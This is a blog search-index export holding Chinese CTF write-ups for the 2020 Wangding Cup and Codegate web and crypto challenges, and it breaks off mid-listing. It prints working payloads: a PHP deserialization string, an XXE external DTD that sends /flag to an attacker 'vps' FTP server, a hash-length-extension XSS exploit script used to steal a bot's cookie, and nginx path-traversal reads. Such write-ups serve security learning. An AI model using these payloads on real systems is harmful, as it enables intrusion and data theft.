<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020网鼎杯-青龙组wp</title>
      <link href="/2020/05/13/2020%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84wp/"/>
      <url>/2020/05/13/2020%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><a id="more"></a><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们选择读文件，op 处弱类型绕过即可，由于是potected 属性，正常反序列化中会有\0，这个题过滤了不可见字符，需要改成public，或者使用p神提到的S大写，后面可以使用hex编码，即\00。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:8:%22flag.php%22;s:1:%22%22&#125;</span><br></pre></td></tr></table></figure><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>上传文件，下载文件，发现下载文件处存在任意文件下载，很多<code>../</code>即可。提示在/flag，但是读取不了，应该是过滤了。</p><p>读取web.xml</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-63132edbf5b6c9bc.png" alt="image.png"></p><p>可以看到 file_in_java，读取 file_in_java.war，拉下源码分析，发现有excel处理：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3b0a3f48c3e2df7a.png" alt="image.png"></p><p>想到excel解析时的xxe，参考<a href="https://www.jishuwen.com/d/2inW/zh-hk，在[Content_Types].xml里插入：" target="_blank" rel="noopener">https://www.jishuwen.com/d/2inW/zh-hk，在[Content_Types].xml里插入：</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://vps/ext.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;%ccc;%ddd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ext.dtd</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % bbb SYSTEM "file:///flag"&gt;&lt;!ENTITY % ccc "&lt;!ENTITY &amp;#37; ddd SYSTEM 'ftp://vps:2121/%bbb;'&gt;"&gt;</span><br></pre></td></tr></table></figure><p>2121端口起个ftp，可以读到flag：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-70465bec165a381d.png" alt="image.png"></p><h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>没啥功能，/status执行命令比较可疑。搜了搜undefsafe有原型链污染，思路就是给Object加个属性，值是我们要执行的命令，然后/status遍历的时候就可以执行命令了。</p><p>先修改note处污染：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-43af71abbe3dd7d3.png" alt="image.png"></p><p>再访问/status，可以弹到shell</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-ce5c531276699271.png" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you_raise_me_up"></a>you_raise_me_up</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">flag = discrete_log(Mod(c,n),Mod(m,n))</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  sage exp1.sage</span><br><span class="line">b<span class="string">'flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 Codegate Web题解</title>
      <link href="/2020/02/10/2020-Codegate%E4%B8%A4%E9%81%93Web%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/02/10/2020-Codegate%E4%B8%A4%E9%81%93Web%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/198479</span><br></pre></td></tr></table></figure><p>Codegate 还是有很多国际强队参加的，这里记录两道 Codegate Web题。</p><a id="more"></a><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目给了 api.php 的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">"q"</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">"sig"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$api_string = base64_decode($_GET[<span class="string">"q"</span>]);</span><br><span class="line">$sig = $_GET[<span class="string">"sig"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($salt.$api_string) !== $sig)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"??"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...</span></span><br><span class="line">$apis = explode(<span class="string">"|"</span>, $api_string);</span><br><span class="line"><span class="keyword">foreach</span>($apis <span class="keyword">as</span> $s) &#123;</span><br><span class="line">    $info = explode(<span class="string">","</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(count($info) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    $n = base64_decode($info[<span class="number">0</span>]);</span><br><span class="line">    $p1 = base64_decode($info[<span class="number">1</span>]);</span><br><span class="line">    $p2 = base64_decode($info[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n === <span class="string">"header"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($p1) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(strpos($p1.$p2, <span class="string">":"</span>) !== <span class="keyword">false</span> || strpos($p1.$p2, <span class="string">"-"</span>) !== <span class="keyword">false</span>) <span class="comment">//Don't trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        header(<span class="string">"$p1: $p2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"cookie"</span>) &#123;</span><br><span class="line">        setcookie($p1, $p2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"body"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;.*&gt;/"</span>, $p1))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $p1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;br /&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"hello"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目的 CSP 的策略是 <code>default-src &#39;self&#39;; script-src &#39;none&#39;; base-uri &#39;none&#39;;</code>，这基本给堵死了，直接打 cookie 不可能了。</p><p>index.php 可以给一个API，得到签名，但是不支持一次多个API，我们没有 key，这里明显是一个哈希长度扩展攻击的考点，采用 <code>salt+msg</code>的方式进行哈希。</p><p>接着 api.php，发现可以设置 header，设置 cookie，输出内容。设置 header做了一定过滤，无法覆盖 CSP 设置。body 这部分过滤没啥用，preg_match 的 . 不匹配 \n。</p><p>关键在于使 CSP 失效，可以设置 HTTP 状态码为 102 使 CSP 失效，同时可以执行js。为了验证我本地写了个 php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; script-src 'none';"</span>);</span><br><span class="line">header(<span class="string">"HTTP/: 102"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我用 nimmis/apache-php7 这个镜像起了个 docker，发现 chrome 是不可以的：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-30150a4a16bf06ad.png" alt="image.png"></p><p>开始以为 chrome 版本问题，试了旧版本还是不行。</p><p>我用 mac 自带的 apache 和 php 环境试了一下，发现是可以的。。。</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0d2d60e00121f497.png" alt="image.png"></p><p>这与 server 还有关系？感兴趣的师傅可以研究解答一下…</p><p>这道题的环境也是可以的，我们随便拿到一个签名，然后用哈希扩展攻击得到想要的签名。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://110.10.147.166/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sig</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(url + <span class="string">"view.php"</span>, params=&#123;<span class="string">'name'</span>: <span class="string">'gml'</span>, <span class="string">'p1'</span>: <span class="string">'gml'</span>, <span class="string">'p2'</span>: <span class="string">'gml'</span>&#125;).content</span><br><span class="line">    sig, msg = res.split(<span class="string">"/api.php?sig="</span>)[<span class="number">1</span>].split(<span class="string">'"&gt;&lt;/iframe&gt;'</span>)[<span class="number">0</span>].split(<span class="string">"&amp;q="</span>)</span><br><span class="line">    <span class="keyword">return</span> sig, msg.decode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sig, msg = get_sig()</span><br><span class="line"></span><br><span class="line">api1 = [<span class="string">'header'</span>, <span class="string">'HTTP/'</span>, <span class="string">'102'</span>]</span><br><span class="line">api2 = [<span class="string">'body'</span>, <span class="string">'&lt;script\n&gt;alert(1)&lt;/script\n&gt;'</span>, <span class="string">''</span>]</span><br><span class="line"></span><br><span class="line">new_msg = <span class="string">"|%s|%s"</span> % (</span><br><span class="line">    <span class="string">','</span>.join(c.encode(<span class="string">"base64"</span>).strip() <span class="keyword">for</span> c <span class="keyword">in</span> api1), <span class="string">','</span>.join(c.encode(<span class="string">"base64"</span>).strip() <span class="keyword">for</span> c <span class="keyword">in</span> api2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># len(salt)=12</span></span><br><span class="line">new_sig, q = hashpumpy.hashpump(sig, msg, new_msg, <span class="number">12</span>)</span><br><span class="line">q = q.encode(<span class="string">"base64"</span>)</span><br><span class="line">print(<span class="string">'&#123;&#125;api.php?sig=&#123;&#125;&amp;q=&#123;&#125;'</span>.format(url, new_sig, q))</span><br></pre></td></tr></table></figure><p>访问，发现可以弹窗：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-5c671add61b5356a.png" alt="image.png"></p><p>改变 xss payload 为打 cookie的，提交给 bot，可以打到cookie：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0488b8f15ae89152.png" alt="image.png"></p><h2 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">It is my first flask project with nginx. Write your own message, and get flag!</span><br><span class="line"></span><br><span class="line">http://110.10.147.169/renderer/ </span><br><span class="line">http://58.229.253.144/renderer/</span><br><span class="line"></span><br><span class="line">DOWNLOAD : http://ctf.codegate.org/099ef54feeff0c4e7c2e4c7dfd7deb6e/022fd23aa5d26fbeea4ea890710178e9</span><br></pre></td></tr></table></figure><p>下载可以得到 settings/run.sh：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">service nginx stop</span><br><span class="line">mv /etc/nginx/sites-enabled/default /tmp/</span><br><span class="line">mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask</span><br><span class="line"></span><br><span class="line">service nginx restart</span><br><span class="line"></span><br><span class="line">uwsgi /home/src/uwsgi.ini &amp;</span><br><span class="line">/bin/bash /home/cleaner.sh &amp;</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>以及 docker file:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span>.<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install -y nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install flask uwsgi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/src /home/src</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/nginx-flask.conf /tmp/nginx-flask.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/static /home/static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /home/tickets</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/tickets</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/run.sh /home/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/cleaner.sh /home/cleaner.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/cleaner.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"/bin/bash"</span>, <span class="string">"/home/run.sh"</span>]</span></span><br></pre></td></tr></table></figure><p>我们能从中得到的主要是目录结构，结合题目描述 nginx，应该存在 nginx 目录遍历。</p><p><code>http://110.10.147.169/static../src/uwsgi.ini</code>，可以下到文件。</p><h3 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h3><p>读源码：</p><p><code>http://110.10.147.169/static../src/app/__init__.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> routes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.strict_slashes = <span class="literal">False</span></span><br><span class="line">app.register_blueprint(routes.front, url_prefix=<span class="string">"/renderer"</span>)</span><br><span class="line">app.config[<span class="string">"FLAG"</span>] = os.getenv(<span class="string">"FLAG"</span>, <span class="string">"CODEGATE2020&#123;&#125;"</span>)</span><br></pre></td></tr></table></figure><p>读routes：</p><p>``<a href="http://110.10.147.169/static../src/app/routes.py`" target="_blank" rel="noopener">http://110.10.147.169/static../src/app/routes.py`</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 